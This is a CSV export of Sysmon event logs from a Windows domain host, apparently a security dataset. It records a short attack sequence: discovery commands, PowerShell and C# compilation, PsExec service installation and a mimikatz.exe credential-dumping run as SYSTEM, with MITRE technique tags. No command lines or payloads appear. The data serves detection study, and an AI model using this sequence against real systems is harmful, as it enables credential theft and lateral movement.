,provider_guid,Provider,EventID,Version,Level,Task,Opcode,Keywords,TimeCreated,EventRecordID,Correlation,Execution,Channel,Computer,Security,RuleName,UtcTime,ProcessGuid,ProcessId,QueryName,QueryStatus,QueryResults,Image,User,FileVersion,Description,Product,Company,OriginalFileName,CommandLine,CurrentDirectory,LogonGuid,LogonId,TerminalSessionId,IntegrityLevel,Hashes,ParentProcessGuid,ParentProcessId,ParentImage,ParentCommandLine,ParentUser,EventType,TargetObject,Details,TargetFilename,CreationUtcTime
10,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},,13,2,4,13,0,0x8000000000000000,,2302,,,Microsoft-Windows-Sysmon/Operational,PC-1.DOMAIN-1.local,,"T1031,T1050",2022-01-24 19:53:34.496,{aeb73b99-6d59-61ed-0b00-000000000500},636,,,,C:\Windows\system32\services.exe,NT AUTHORITY\SYSTEM,,,,,,,,,,,,,,,,,,,,,,
11,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},,1,5,4,1,0,0x8000000000000000,,2301,,,Microsoft-Windows-Sysmon/Operational,PC-1.DOMAIN-1.local,,-,2022-01-24 19:53:34.484,{aeb73b99-03be-61ef-4604-000000000500},4268,,,,C:\Users\Administrator\Downloads\mimikatz_trunk\x64\mimikatz.exe,NT AUTHORITY\SYSTEM,,,,,,,,,,,,,,,,,,,,,,
12,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},,1,5,4,1,0,0x8000000000000000,,2300,,,Microsoft-Windows-Sysmon/Operational,PC-1.DOMAIN-1.local,,-,2022-01-24 19:53:34.296,{aeb73b99-03be-61ef-4504-000000000500},6908,,,,C:\Windows\PSEXESVC.exe,NT AUTHORITY\SYSTEM,,,,,,,,,,,,,,,,,,,,,,
13,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},,13,2,4,13,0,0x8000000000000000,,2299,,,Microsoft-Windows-Sysmon/Operational,PC-1.DOMAIN-1.local,,"T1031,T1050",2022-01-24 19:53:34.277,{aeb73b99-6d59-61ed-0b00-000000000500},636,,,,C:\Windows\system32\services.exe,NT AUTHORITY\SYSTEM,,,,,,,,,,,,,,,,,,,,,,
14,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},,13,2,4,13,0,0x8000000000000000,,2298,,,Microsoft-Windows-Sysmon/Operational,PC-1.DOMAIN-1.local,,"T1031,T1050",2022-01-24 19:53:34.277,{aeb73b99-6d59-61ed-0b00-000000000500},636,,,,C:\Windows\system32\services.exe,NT AUTHORITY\SYSTEM,,,,,,,,,,,,,,,,,,,,,,
15,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},,11,2,4,11,0,0x8000000000000000,,2297,,,Microsoft-Windows-Sysmon/Operational,PC-1.DOMAIN-1.local,,EXE,2022-01-24 19:53:34.277,{aeb73b99-03be-61ef-4404-000000000500},4880,,,,C:\PSTools\PsExec.exe,DOMAIN-1\Administrator,,,,,,,,,,,,,,,,,,,,,,
16,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},,13,2,4,13,0,0x8000000000000000,,2296,,,Microsoft-Windows-Sysmon/Operational,PC-1.DOMAIN-1.local,,"Alert,Sysinternals Tool Used",2022-01-24 19:53:34.246,{aeb73b99-03be-61ef-4404-000000000500},4880,,,,C:\PSTools\PsExec.exe,DOMAIN-1\Administrator,,,,,,,,,,,,,,,,,,,,,,
17,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},,1,5,4,1,0,0x8000000000000000,,2295,,,Microsoft-Windows-Sysmon/Operational,PC-1.DOMAIN-1.local,,-,2022-01-24 19:53:34.217,{aeb73b99-03be-61ef-4404-000000000500},4880,,,,C:\PSTools\PsExec.exe,DOMAIN-1\Administrator,,,,,,,,,,,,,,,,,,,,,,
18,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},,1,5,4,1,0,0x8000000000000000,,2294,,,Microsoft-Windows-Sysmon/Operational,PC-1.DOMAIN-1.local,,-,2022-01-24 19:53:34.059,{aeb73b99-03be-61ef-4204-000000000500},4332,,,,C:\Windows\System32\cmd.exe,DOMAIN-1\Administrator,,,,,,,,,,,,,,,,,,,,,,
19,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},,11,2,4,11,0,0x8000000000000000,,2293,,,Microsoft-Windows-Sysmon/Operational,PC-1.DOMAIN-1.local,,DLL,2022-01-24 19:53:33.902,{aeb73b99-03bd-61ef-4004-000000000500},1484,,,,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe,DOMAIN-1\Administrator,,,,,,,,,,,,,,,,,,,,,,
20,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},,1,5,4,1,0,0x8000000000000000,,2292,,,Microsoft-Windows-Sysmon/Operational,PC-1.DOMAIN-1.local,,-,2022-01-24 19:53:33.901,{aeb73b99-03bd-61ef-4104-000000000500},3528,,,,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe,DOMAIN-1\Administrator,,,,,,,,,,,,,,,,,,,,,,
21,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},,1,5,4,1,0,0x8000000000000000,,2291,,,Microsoft-Windows-Sysmon/Operational,PC-1.DOMAIN-1.local,,-,2022-01-24 19:53:33.772,{aeb73b99-03bd-61ef-4004-000000000500},1484,,,,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe,DOMAIN-1\Administrator,,,,,,,,,,,,,,,,,,,,,,
22,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},,11,2,4,11,0,0x8000000000000000,,2290,,,Microsoft-Windows-Sysmon/Operational,PC-1.DOMAIN-1.local,,-,2022-01-24 19:53:33.764,{aeb73b99-03bc-61ef-3f04-000000000500},6324,,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,DOMAIN-1\Administrator,,,,,,,,,,,,,,,,,,,,,,
23,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},,11,2,4,11,0,0x8000000000000000,,2289,,,Microsoft-Windows-Sysmon/Operational,PC-1.DOMAIN-1.local,,DLL,2022-01-24 19:53:33.764,{aeb73b99-03bc-61ef-3f04-000000000500},6324,,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,DOMAIN-1\Administrator,,,,,,,,,,,,,,,,,,,,,,
24,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},,11,2,4,11,0,0x8000000000000000,,2288,,,Microsoft-Windows-Sysmon/Operational,PC-1.DOMAIN-1.local,,-,2022-01-24 19:53:33.167,{aeb73b99-03bc-61ef-3f04-000000000500},6324,,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,DOMAIN-1\Administrator,,,,,,,,,,,,,,,,,,,,,,
25,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},,1,5,4,1,0,0x8000000000000000,,2287,,,Microsoft-Windows-Sysmon/Operational,PC-1.DOMAIN-1.local,,-,2022-01-24 19:53:32.980,{aeb73b99-03bc-61ef-3f04-000000000500},6324,,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,DOMAIN-1\Administrator,,,,,,,,,,,,,,,,,,,,,,
26,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},,1,5,4,1,0,0x8000000000000000,,2286,,,Microsoft-Windows-Sysmon/Operational,PC-1.DOMAIN-1.local,,-,2022-01-24 19:53:17.477,{aeb73b99-03ad-61ef-3e04-000000000500},6864,,,,C:\Windows\System32\whoami.exe,DOMAIN-1\Administrator,,,,,,,,,,,,,,,,,,,,,,
27,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},,1,5,4,1,0,0x8000000000000000,,2285,,,Microsoft-Windows-Sysmon/Operational,PC-1.DOMAIN-1.local,,-,2022-01-24 19:53:17.452,{aeb73b99-03ad-61ef-3d04-000000000500},4816,,,,C:\Windows\System32\HOSTNAME.EXE,DOMAIN-1\Administrator,,,,,,,,,,,,,,,,,,,,,,
